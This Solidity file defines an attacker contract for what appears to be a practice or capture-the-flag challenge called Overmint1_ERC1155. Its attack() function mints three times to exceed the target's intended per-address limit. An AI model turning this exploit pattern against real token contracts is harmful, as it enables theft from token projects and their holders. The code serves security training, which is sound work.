// SPDX-License-Identifier: GPL-3.0
pragma solidity 0.8.15;

import "./Overmint1ERC1155.sol";

contract Overmint1_ERC1155_Attacker is ERC1155Receiver {
    Overmint1_ERC1155 public overmint1;

    address public owner;

    constructor(Overmint1_ERC1155 _overmint) {
        overmint1 = _overmint;
        owner = msg.sender;
    }

    function attack() external {
        overmint1.mint(1, "");
        overmint1.mint(1, "");
        overmint1.mint(1, "");
    }

    function onERC1155Received(
        address,
        address,
        uint256,
        uint256,
        bytes calldata
    ) external pure override returns (bytes4) {
        return this.onERC1155Received.selector;
    }

      function onERC1155BatchReceived(
        address,
        address,
        uint256[] calldata,
        uint256[] calldata,
        bytes calldata
    ) external pure override returns (bytes4) {
        return this.onERC1155BatchReceived.selector;
    }

}
